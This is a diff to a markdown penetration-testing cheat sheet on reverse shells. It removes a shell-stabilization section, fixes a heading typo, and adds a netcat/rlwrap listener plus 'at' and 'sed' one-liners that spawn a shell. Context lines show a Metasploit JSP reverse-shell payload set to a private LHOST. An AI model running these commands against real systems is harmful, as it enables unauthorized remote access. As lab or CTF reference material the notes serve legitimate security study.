@@ -4,41 +4,14 @@
 
 {% embed url="https://revshells.com" %}
 
-### Stabilizing Shells
-
-* Two ways to stabilized shells on Linux
-
-```
-script /dev/null -c bash
-```
-
-* Or:
-
-```
-#get installed python version
-which python3 
-which python 
-#use whichever version of python is installed 
-python3 -c 'import pty;pty.spawn("/bin/bash");'
-python -c 'import pty;pty.spawn("/bin/bash");'
-#gives access to clear command
-export TERM=xterm
-#background remote shell
-CTRL+Z
-#on your local station
-stty raw -echo;fg
-ENTER Twice
-stty -a #on local shell
-#on remote session
-stty rows 61 cols 116 
-```
-
 ### Reverse Shells
 
-**Listensers**
+**Listeners**
 
 ```
 nc -nlvp 9001
+# or a more stable listener
+rlwrap --always-readline nc -nvlp 443
 ```
 
 * Always set up a **netcat** listener before executing a bash reverse shell
@@ -153,6 +126,18 @@ set payload java/jsp_shell_reverse_tcp
 set LHOST 172.16.6.1
 set LPORT 1234
 run
+```
+
+#### AT
+
+```bash
+echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
+```
+
+#### SED
+
+```bash
+sed -n '1e exec sh 1>&0' /etc/hosts
 ```
 
 ### **Reverse shell over the Telnet Protocol**
